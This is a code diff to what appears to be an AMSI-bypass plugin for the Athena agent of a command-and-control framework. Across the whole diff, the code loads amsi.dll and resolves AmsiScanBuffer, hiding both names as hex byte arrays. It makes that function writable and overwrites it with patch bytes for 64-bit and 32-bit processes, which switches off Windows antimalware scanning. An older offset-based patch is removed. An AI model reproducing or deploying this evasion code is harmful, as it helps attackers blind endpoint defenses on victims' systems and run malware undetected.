@@ -8,6 +8,10 @@ namespace Plugin
 {
     public static class amsi
     {
+        static byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+        static byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+
+
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
         [DllImport("kernel32")]
@@ -20,26 +24,37 @@ namespace Plugin
         {
             try
             {
-
-                if (Patch())
+                if (Environment.Is64BitProcess)
                 {
-                    return new ResponseResult
+                    if (SpearAndShield(sword))
                     {
-                        completed = "true",
-                        user_output = "Success",
-                        task_id = (string)args["task-id"], //task-id passed in from Athena
-                    };
+                        return new ResponseResult
+                        {
+                            completed = "true",
+                            user_output = "Success",
+                            task_id = (string)args["task-id"], //task-id passed in from Athena
+                        };
+                    }
                 }
                 else
                 {
-                    return new ResponseResult
+                    if (SpearAndShield(spear))
                     {
-                        completed = "true",
-                        user_output = "Failed",
-                        task_id = (string)args["task-id"], //task-id passed in from Athena
-                        status = "error"
-                    };
+                        return new ResponseResult
+                        {
+                            completed = "true",
+                            user_output = "Success",
+                            task_id = (string)args["task-id"], //task-id passed in from Athena
+                        };
+                    }
                 }
+                return new ResponseResult
+                {
+                    completed = "true",
+                    user_output = "Failed",
+                    task_id = (string)args["task-id"], //task-id passed in from Athena
+                    status = "error"
+                };
             }
             catch (Exception e)
             {
@@ -53,37 +68,40 @@ namespace Plugin
                 };
             }
         }
-        public static bool Patch()
+        
+        private static bool SpearAndShield(byte[] shield)
         {
-            byte[] dllBytes = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
-            IntPtr someDLL = LoadLibrary(Encoding.ASCII.GetString(dllBytes));
-            if (someDLL == IntPtr.Zero)
+            try
+            {
+                byte[] bSword = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
+                IntPtr pSword = LoadLibrary(Encoding.ASCII.GetString(bSword));
+
+                if (pSword == IntPtr.Zero)
+                {
+                    return false;
+                }
+
+
+                byte[] bufSword = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
+                IntPtr pShield = GetProcAddress(pSword, Encoding.ASCII.GetString(bufSword));
+                if (pShield == IntPtr.Zero)
+                {
+                    return false;
+                }
+
+                uint uCape;
+                if (!VirtualProtect(pShield, (UIntPtr)shield.Length, 0x40, out uCape))
+                {
+                    return false;
+                }
+
+                Marshal.Copy(shield, 0, pShield, shield.Length);
+                return true;
+            }
+            catch (Exception e)
             {
                 return false;
             }
-            byte[] bufBytes = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
-            IntPtr pAmsi = GetProcAddress(someDLL, Encoding.ASCII.GetString(bufBytes));
-            if (pAmsi == IntPtr.Zero)
-            {
-                return false;
-            }
-
-            UIntPtr dwSize = (UIntPtr)4;
-            uint Zero = 0;
-
-            if (!VirtualProtect(pAmsi, dwSize, 0x40, out Zero))
-            {
-                return false;
-            }
-
-            Byte[] biz = { 0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3 }; 
-
-            IntPtr ptr = Marshal.AllocHGlobal(13);
-            Marshal.Copy(biz, 0, ptr, 13);
-
-            MoveMemory(pAmsi + 0x001b, ptr, 13);
-            return true;
         }
     }
-
 }
